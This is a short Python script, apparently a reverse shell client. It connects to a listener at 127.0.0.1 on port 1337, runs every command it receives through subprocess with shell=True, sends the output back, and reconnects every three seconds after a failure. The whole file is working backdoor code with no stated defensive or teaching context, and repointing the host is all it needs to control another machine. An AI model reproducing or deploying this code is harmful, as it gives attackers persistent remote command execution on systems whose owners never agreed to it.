import subprocess
import os
import socket
import time

while True:
	target_host = "127.0.0.1"
	target_port = 1337

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		client.connect((target_host, target_port))
		while True:
			cmd = client.recv(1024)
			cmd = cmd.decode("ascii")

			# Empty command
			if cmd == "":
				continue
			elif cmd == "close_socket":
				client.send(b"dss1337")
				client.close()
				break
			# Change Directory command
			cmd_parts = cmd.split()
			if cmd_parts[0] == "cd" and (len(cmd_parts) > 1):
				try:
					os.chdir(cmd_parts[1])
					cmd = "cd"
				except FileNotFoundError as err:
					cmd = "echo FileNotFoundError"

			try:
				cmd_out = subprocess.check_output(cmd, shell=True)
			except subprocess.CalledProcessError as err:
				cmd_out = str(err)
				cmd_out = cmd_out.encode("ascii")
			except:
				cmd_out = "Unhandled Error has occur."
				cmd_out = cmd_out.encode("ascii")
			client.send(cmd_out)
			
	except:
		time.sleep(3)
		continue